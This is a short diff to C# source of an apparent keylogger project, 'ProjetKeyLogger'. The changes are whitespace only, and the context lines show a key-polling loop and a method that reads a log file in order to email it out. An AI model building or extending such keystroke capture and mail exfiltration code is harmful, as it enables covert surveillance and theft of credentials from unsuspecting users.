@@ -55,6 +55,8 @@ namespace ProjetKeyLogger
             bool ctrl = false;
             bool altgr = false;
 
+
+
             while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
                
@@ -362,7 +364,6 @@ namespace ProjetKeyLogger
         //Envoie du fichier par mail
         private void envoieMail()
         {
-
             //recuperation du contenu du fichier
             string contenu_fichier = File.ReadAllText(file_path);
 
